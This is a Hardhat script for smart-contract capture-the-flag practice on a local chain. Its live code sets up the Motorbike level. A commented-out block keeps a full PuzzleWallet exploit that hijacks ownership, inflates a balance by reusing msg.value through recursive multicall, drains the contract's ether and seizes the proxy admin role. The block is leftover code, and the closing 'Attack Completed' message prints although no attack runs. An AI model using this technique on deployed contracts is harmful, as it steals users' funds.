/*

*/

const hre = require("hardhat");
const { expect } = require("chai")

async function main() {
  // Recreating the attack on ganache
  [player, deployer,user] = await ethers.getSigners();

  //Fund the player account - Run it only if is the first time this script is executed on the local blockchain!
  await user.sendTransaction({
    to: player.address,
    value: ethers.utils.parseEther("50.0"), // Sends exactly 50.0 ether
  });

  let tx;
  let txReceipt;

  // Deploy Factory Contract
  const MotorbikeFactory = await hre.ethers.getContractFactory("MotorbikeFactory");
  this.motorbikeFactory = await MotorbikeFactory.connect(deployer).deploy();
  await this.motorbikeFactory.deployed();

  // Deploy the Motorbike and Engine contract through the MotorbikeFactory contract
  tx = await this.motorbikeFactory.connect(deployer).createInstance(player.address,{value: 0});
  await tx.wait()

  const MotorbikeContractAddress = await this.motorbikeFactory.MotorbikeContract();  // Motorbike Contract address
  const EngineContractAddress = await this.motorbikeFactory.EngineContract();  // Engine Contract address

  // Creating an instance of the deployed Motorbike contract
  this.motorbikeContract = await hre.ethers.getContractAt("Motorbike",MotorbikeContractAddress);

  // Creating an instance of the deployed Motorbike contract using the logic of the Engine contract
  this.engineContractProxyInstance = await hre.ethers.getContractAt("Engine",MotorbikeContractAddress);


  console.log(
    `
    MotorbikeContractAddress ${MotorbikeContractAddress} \n
    EngineContractAddress ${EngineContractAddress} \n\n
    
    upgrader:  ${await this.engineContractProxyInstance.upgrader()} \n
    horsePower: ${await this.engineContractProxyInstance.horsePower()}
    `
  );


  /*
  console.log("\n\n Performing attack ... \n\n");

  // console.log("Deploying the Attack contract");
  // const AttackPuzzleWallet = await hre.ethers.getContractFactory("AttackPuzzleWallet");
  // this.attackPuzzleWallet = await AttackPuzzleWallet.connect(player).deploy(ProxyContractAddress);
  // await this.attackPuzzleWallet.deployed();

  console.log("Gainning ownership of the PuzzleWallet contract!");
  tx = await this.puzzleProxy.connect(player).proposeNewAdmin(player.address);
  txReceipt = await tx.wait();
  // console.log(txReceipt);

  console.log("Adding Player to the Whitelist on the PuzzleWallet");
  tx = await this.puzzleProxyInstance.connect(player).addToWhitelist(player.address);
  txReceipt = await tx.wait();
  // console.log(txReceipt);

  console.log("Was the player added to the whitelist?");
  console.log(await this.puzzleProxyInstance.whitelisted(player.address));

  expect(await this.puzzleProxyInstance.whitelisted(player.address)).to.eq(true);

  console.log("Player is now the PuzzleWallet's owner and has been added to the whitelist!");

  console.log("Starting phase 2 to become the Admin of the PuzzleProxy contract!");
  console.log("Encoding the data that will be sent to the multicall() function to alter the Player's balance!");

  const iface = new hre.ethers.utils.Interface([
    "function deposit() payable",
    "function execute(address to, uint256 value, bytes calldata data) payable",
    "function multicall(bytes[] calldata data) payable"
  ]);

  // Encoding the data that will be sent on the multicall() recursive attack
  // The amount of ETH that will be sent on a transaction is actually defined when the transaction is sent.... For now we are only encoding the data!

  const deposit_encoded = iface.encodeFunctionData("deposit",[]);
  // console.log("deposit_encoded: ", deposit_encoded);

  const multicall_callDeposit_encoded = iface.encodeFunctionData("multicall",[ [deposit_encoded] ])
  // console.log("multicall_callDeposit_encoded:" , multicall_callDeposit_encoded);

  // Encode the data to call the multicall() that will call 10 times multicall() function and on each call to multicall() will call deposit()
    // This is where the player's balance is hijacked, the msg.value that is sent alongside with this transaction will be reused 10 times to increase the player's balance on each call made to the deposit()
    // But the real ETH balance will only grow by the real value of msg.value!
  
  // The data sent to multicall() will actually be an array of 10 positions, each position is a call to multicall() that will call deposit() 
  // The function's signature of the multicall() must appear 11 times in the encoded data!
    // The first function signature is the one corresponding to the below encoding operation, and the other 10 are the ones corresponding the multicall() recursive attack!
      // That means, that the function signature of the deposit() must also appear 10 times! -> One per each call to the multicall() in the recursive attack!
          // deposit() function signature   =>  0xd0e30db0
          // multicall() function signature =>  0xac9650d8
  const multicallRecursiveCallAttack_encoded = iface.encodeFunctionData("multicall",[ Array(10).fill(multicall_callDeposit_encoded) ])
  // console.log("multicallRecursiveCallAttack_encoded:" , multicallRecursiveCallAttack_encoded);

  console.log("Encoded data is ready to hijacked the player's balances by exploiting the multicall() function");

  console.log("Sending tx to exploit multicall() function!");
  const totalProxyBalanceBeforeStartingAttack = hre.ethers.utils.formatEther(await hre.ethers.provider.getBalance(ProxyContractAddress));
  tx = await this.puzzleProxyInstance.connect(player).multicall( [ multicallRecursiveCallAttack_encoded ] , {value: hre.ethers.utils.parseEther(totalProxyBalanceBeforeStartingAttack)})
  await tx.wait()
  
  const totalProxyBalanceAfterExploitingMulticall = hre.ethers.utils.formatEther(await hre.ethers.provider.getBalance(ProxyContractAddress));
  console.log("totalProxyBalanceAfterExploitingMulticall: ", totalProxyBalanceAfterExploitingMulticall);

  const playerBalanceAfterExploitingMulticall = hre.ethers.utils.formatEther(await this.puzzleProxyInstance.balances(player.address));
  console.log("playerBalanceAfterExploitingMulticall: ", playerBalanceAfterExploitingMulticall);

  if( playerBalanceAfterExploitingMulticall <  totalProxyBalanceAfterExploitingMulticall) throw new TypeError('Player balance is less than the PuzzleProxy balance, it won;t be enough to drain all the PuzzleProxy balance');

  
  console.log("drain the contract's balance");
  tx = await this.puzzleProxyInstance.connect(player).execute(player.address, hre.ethers.utils.parseEther(totalProxyBalanceAfterExploitingMulticall), []);
  //tx = await this.puzzleProxyInstance.connect(player).execute(player.address, 0x0410, []);
  txReceipt = await tx.wait();
  //console.log(txReceipt);

  const totalProxyBalanceAfterDrainingAllTheBalance = hre.ethers.utils.formatEther(await hre.ethers.provider.getBalance(ProxyContractAddress));
  console.log("totalProxyBalanceAfterDrainingAllTheBalance: ", totalProxyBalanceAfterDrainingAllTheBalance);


  if( totalProxyBalanceAfterDrainingAllTheBalance > 0 ) throw new TypeError('PuzzleProxy contract has not been fully drainned');

  // Update the maxBalance, send the player's address masked as an uint256
    // @note - Looks like when sending data from EtherJS to the blockchain it doesn't strictly requires to convert the address for an uint!
  console.log("Setting the Player as the Proxy admin");
  tx = await this.puzzleProxyInstance.connect(player).setMaxBalance(player.address);
  await tx.wait();

  const adminProxy = await this.puzzleProxy.admin();
  expect(adminProxy).to.eq(player.address);

  console.log("Level passed, Player has taken the admin of the PuzzleProxy contract!");

  console.log(
    `
    ProxyContractAddress ${ProxyContractAddress} \n
    LogicContractAddress ${LogicContractAddress} \n\n

    PuzzleProxy Admin:  ${await this.puzzleProxy.admin()} \n
    PuzzleWallet Owner: ${await this.puzzleProxyInstance.owner()}
    `
  );
  */

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});